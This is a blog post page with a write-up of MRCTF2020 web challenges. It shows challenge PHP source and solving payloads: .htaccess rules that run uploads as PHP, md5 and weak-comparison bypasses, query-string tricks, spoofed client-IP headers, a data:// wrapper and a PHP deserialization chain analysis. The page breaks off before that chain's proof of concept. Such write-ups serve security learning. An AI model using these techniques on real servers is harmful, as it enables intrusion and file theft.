@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Bantian">
+
+
+
+
+
+<title>MRCTF2020 Web Writeup-1 | Bantian</title>
+
+
+
+    <link rel="icon" href="/my.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Archives</a>
+                
+                    <a class="menu-item" href="/categories">Categories</a>
+                
+                    <a class="menu-item" href="/tags">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">MRCTF2020 Web Writeup-1</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">March 31, 2020&nbsp;&nbsp;23:41:57</a>
+                        </span>
+                    
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h3 id="1-你传你🐎呢"><a href="#1-你传你🐎呢" class="headerlink" title="1. 你传你🐎呢"></a>1. 你传你🐎呢</h3><p>打开题目，是一道文件上传题。</p>
+<p>上传最普通的php文件，<code>&lt;?php phpinfo();?&gt;</code>，不过肯定不行，不可能这么简单。经过测试之后，是<code>Content-Type</code>有问题，后端会检查该类型，只能接收<code>Content-Type:image/png</code>类型的文件，并且文件名后缀不能是以下几种常见的php文件类型：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php, phtml, pht, php5</span><br></pre></td></tr></table></figure>
+
+<p>但是可以上传<code>.htaccess</code>后缀文件，这就好办多了。</p>
+<p>第一步，上传<code>.htaccess</code>使其能解析图片中的php命令。</p>
+<p>这里一般有两种方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">"vuln"</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/31/[MRCTF2020]Web-WriteUp-1/imgs/2.png" alt="2"></p>
+<p>这表示用php解析<code>vuln</code>文件中的内容。</p>
+<p>上传一句话木马：</p>
+<p><img src="/2020/03/31/[MRCTF2020]Web-WriteUp-1/imgs/3.png" alt="3"></p>
+<p>第二种方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/31/[MRCTF2020]Web-WriteUp-1/imgs/4.png" alt="4"></p>
+<p>这表示用php解析<code>.jpg</code>后缀的文件。</p>
+<p>但在调用<code>system()</code>函数读取flag文件的时候却发现<code>system()</code>函数被禁用了。</p>
+<p>打印<code>phpinfo()</code>查看所有的disables_functions:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld</span><br></pre></td></tr></table></figure>
+
+<p>但是我们还可以用<code>show_source()</code>或是`highlight_file()函数来读取flag文件。</p>
+<p><img src="/2020/03/31/[MRCTF2020]Web-WriteUp-1/imgs/6.png" alt="6"></p>
+<h3 id="2-ez-bypass"><a href="#2-ez-bypass" class="headerlink" title="2.  ez_bypass"></a>2.  ez_bypass</h3><p>打开题目发现就是代码审计的题目：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$flag=<span class="string">'MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'gg'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">'gg'</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'You got the first step'</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'passwd'</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">'passwd'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">'Good Job!'</span>;</span><br><span class="line">                     highlight_file(<span class="string">'flag.php'</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">'By Retr_0'</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">"can you think twice??"</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'You can not get it !'</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'only one way to get the flag'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"You are not a real hacker!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Please input first'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>
+
+<p>第一层需要绕过md5比较，方法比较简单，md5不能对数组元素进行加密，所以只要用数组绕过即可</p>
+<p>第二层是关于POST参数<code>$passwd</code>的弱类型比较，<code>$passwd==1234567</code>，令<code>$passwd=1234567aa</code>即可</p>
+<p>最后的payload就是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?gg[]&#x3D;111&amp;id[]&#x3D;222</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; POST</span><br><span class="line">passwd&#x3D;1234567s</span><br></pre></td></tr></table></figure>
+
+<p>获得flag。</p>
+<p><img src="/2020/03/31/[MRCTF2020]Web-WriteUp-1/imgs/1.png" alt="1"></p>
+<h3 id="3-套娃"><a href="#3-套娃" class="headerlink" title="3. 套娃"></a>3. 套娃</h3><p>打开题目右键view-source得到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Y0u are So cutE!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are going to the next ~"</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里第2个if很好绕过，在正则表达式中，<strong>$可以匹配行尾或者一个换行符</strong>，所以在字符串<code>23333</code>的后面加一个换行符<code>%0a</code>就可以绕过。</p>
+<p>第一个if需要query_string中不包含<code>_</code>，一般这种情况我们会尝试编码绕过，因为query_string不会进行urldecode，但是编码后的<code>_</code>为<code>%5f</code>也被过滤了。所以这里需要找其他替代字符。</p>
+<p>这里有一个关于php的小技巧，php会将通过<code>$_GET</code>请求传入的参数中的非法字符转换为下划线。</p>
+<p>可以fuzz来看一下有哪些字符会被php认为是非法字符。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// t.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">	<span class="keyword">echo</span> $re;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里又分成两种情况：</p>
+<ol>
+<li>非法字符为首字符时：只有<code>.</code>被替换为<code>_</code></li>
+</ol>
+<p><img src="/2020/03/31/[MRCTF2020]Web-WriteUp-1/imgs/11.png" alt="11"></p>
+<ol start="2">
+<li>非法字符不为首字符时：</li>
+</ol>
+<p><img src="/2020/03/31/[MRCTF2020]Web-WriteUp-1/imgs/12.png" alt="12"></p>
+<p>题目属于情况2，所以我们可以用以下几种来替代<code>_</code>绕过第一个if条件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. b u p t</span><br><span class="line">2. b+u+p+t</span><br><span class="line">3. b.u.p.t</span><br><span class="line">4. b[u[p[t	&#x2F;&#x2F; 但其实这个不行，不太清楚原因</span><br></pre></td></tr></table></figure>
+
+<p>最后得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b.u.p.t&#x3D;23333%0a</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/31/[MRCTF2020]Web-WriteUp-1/imgs/8.png" alt="8"></p>
+<p>访问<code>secrettw.php</code>：</p>
+<p><img src="/2020/03/31/[MRCTF2020]Web-WriteUp-1/imgs/9.png" alt="9"></p>
+<p>发现一串用JSFUCK表示的js代码，拿去解码得到：<code>post me Merak</code>。</p>
+<p><img src="/2020/03/31/[MRCTF2020]Web-WriteUp-1/imgs/10.png" alt="10"></p>
+<p>请求<code>secrettw.php</code>时加一个post参数<code>Merak=1</code>即可得到源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的if条件语句需要本地访问，伪造http请求头：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line">X-Real-IP: 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/31/[MRCTF2020]Web-WriteUp-1/imgs/13.png" alt="13"></p>
+<p>第二个点就是需要绕过<code>file_get_contents()</code>，用<code>data://</code>伪协议就可以了。</p>
+<p>然后源码会对用户传入的<code>$_GET[&#39;file&#39;]</code>参数进行解密，所以我们需要先传入一个加密后的参数值。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span><span class="params">($v)</span></span>&#123;</span><br><span class="line">	$re = <span class="string">''</span>;</span><br><span class="line">	<span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">		$re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	$v = base64_encode($re);</span><br><span class="line">	<span class="keyword">return</span> $v;</span><br><span class="line">&#125;</span><br><span class="line">$a = unchange(<span class="string">'flag.php'</span>);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">// ZmpdYSZmXGI=</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>最后得到的payload为：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secrettw.php?2333=data://text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/31/[MRCTF2020]Web-WriteUp-1/imgs/14.png" alt="14"></p>
+<h3 id="4-EzPOP"><a href="#4-EzPOP" class="headerlink" title="4. EzPOP"></a>4. EzPOP</h3><p>打开题目，发现是一道反序列化代码审计题：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'pop'</span>]))&#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">'pop'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> <a href="https://ctf.ieki.xyz/library/php.html" target="_blank" rel="noopener">https://ctf.ieki.xyz/library/php.html</a> 中列出了一些与反序列化相关的魔术方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">__construct()&#x2F;&#x2F;当一个对象创建时被调用</span><br><span class="line">__destruct() &#x2F;&#x2F;当一个对象销毁时被调用</span><br><span class="line">__toString() &#x2F;&#x2F;当一个对象被当作一个字符串使用</span><br><span class="line">__sleep()&#x2F;&#x2F;在对象在被序列化之前运行</span><br><span class="line">__wakeup()&#x2F;&#x2F;将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</span><br><span class="line">__get()&#x2F;&#x2F;获得一个类的成员变量时调用</span><br><span class="line">__set()&#x2F;&#x2F;设置一个类的成员变量时调用</span><br><span class="line">__invoke()&#x2F;&#x2F;调用函数的方式调用一个对象时的回应方法</span><br><span class="line">__call()&#x2F;&#x2F;当调用一个对象中的不能用的方法的时候就会执行这个函数</span><br></pre></td></tr></table></figure>
+
+<p>上面比较不常见的是<code>__invoke()</code>，它是在将对象当作函数来使用的时候，会自动调用该方法，举个例子：</p>
+<p><img src="/2020/03/31/[MRCTF2020]Web-WriteUp-1/imgs/15.png" alt="15"></p>
+<p>回到本道题目，我们知道：</p>
+<ol>
+<li>读取flag的关键点就在<code>Modifier</code>中<code>append()</code>方法中的<code>include($value);</code>，该方法在该类的魔术方法<code>__invoke()</code>方法中被调用，所以需要触发<code>__invoke()</code>方法，只要直接将<code>Modifier</code>类当作函数来调用即可；</li>
+<li>当<code>Show</code>类被创建时，<code>__construct()</code>函数被调用，其中有<code>echo</code>，所以会调用<code>__toString()</code>方法；</li>
+<li><code>__toString()</code>方法会访问<code>$this-&gt;str-&gt;source</code>属性，令<code>src</code>是<code>Test</code>类的一个实例，<code>Test</code>类会调用<code>__get()</code>魔术方法；</li>
+<li><code>__get()</code>方法会将它的<code>p</code>属性当成函数调用，令<code>$this-&gt;p=Modifier()</code>，会返回一个<code>return Modifier()</code>，从而触发了<code>Modifier</code>类中的<code>__invoke()</code>方法；</li>
+<li><code>__invoke()</code>方法调用了<code>append()</code>方法，该方法会<code>include($value)</code>，令<code>$value</code>为<code>flag.php</code>源码即可。</li>
+</ol>
+<p>对应的poc为:</p>
